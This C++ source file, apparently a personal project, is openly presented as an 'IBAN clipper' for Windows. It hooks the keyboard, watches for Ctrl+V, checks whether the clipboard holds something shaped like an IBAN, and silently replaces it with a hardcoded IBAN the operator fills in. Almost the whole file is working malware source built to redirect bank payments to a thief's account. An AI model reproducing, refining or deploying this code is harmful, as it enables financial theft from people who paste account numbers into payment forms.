/**
 * Author : Yekuuun
 * Github : https://github.com/yekuuun
 * A base Iban clipper developped by myself.
 */

#include <windows.h>
#include <string>
#include <iostream>

HHOOK keyboardHook;
std::string IBAN = "BE0000000000000000"; // your IBAN TO SETUP;

BOOL isIbanValue(char* ptrClipboardText){
    if(ptrClipboardText == nullptr || *ptrClipboardText == '\0')
    {
        return false;
    }

    size_t length = strlen(ptrClipboardText);

    if (length < 15 || length > 34) 
    {
        return false;
    }

    if (!std::isalpha(ptrClipboardText[0]) || !std::isalpha(ptrClipboardText[1])) 
    {
        return false;
    }

    if (!std::isdigit(ptrClipboardText[2]) || !std::isdigit(ptrClipboardText[3])) 
    {
        return false;
    }

    for (size_t i = 4; i < length; ++i) 
    {
        if (!std::isalnum(ptrClipboardText[i])) 
        {
            return false;
        }
    }

    return true;
}

/**
 * Base clipper callback function.
 */
LRESULT CALLBACK clipper(int nCode, WPARAM wParam, LPARAM lParam) {
    HANDLE hClipboardData = nullptr;

    if (nCode >= 0) {
        if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) && (reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam)->vkCode == 'V')) 
        {
            OpenClipboard(nullptr);
            hClipboardData = GetClipboardData(CF_TEXT);

            if (hClipboardData != nullptr) 
            {
                char* pClipboardText = static_cast<char*>(GlobalLock(hClipboardData));
                if (pClipboardText != nullptr && isIbanValue(pClipboardText)) 
                {
                    std::string newText = IBAN; // New clipboard content
                    GlobalUnlock(hClipboardData);
                    
                    EmptyClipboard();
                    HGLOBAL hNewClipboardData = GlobalAlloc(GMEM_MOVEABLE, newText.size() + 1);
                    if (hNewClipboardData != nullptr) 
                    {
                        char* pNewClipboardText = static_cast<char*>(GlobalLock(hNewClipboardData));
                        if (pNewClipboardText != nullptr) 
                        {
                            memcpy(pNewClipboardText, newText.c_str(), newText.size() + 1);
                            GlobalUnlock(hNewClipboardData);
                            SetClipboardData(CF_TEXT, hNewClipboardData);
                        }
                    }
                }
            }
            CloseClipboard();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

/**
 * Entry point.
 */
int main(int argc, char* argv[]){
    MSG msg;

    SetWindowsHookEx(WH_KEYBOARD_LL, clipper, nullptr, 0);

    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return EXIT_SUCCESS;
}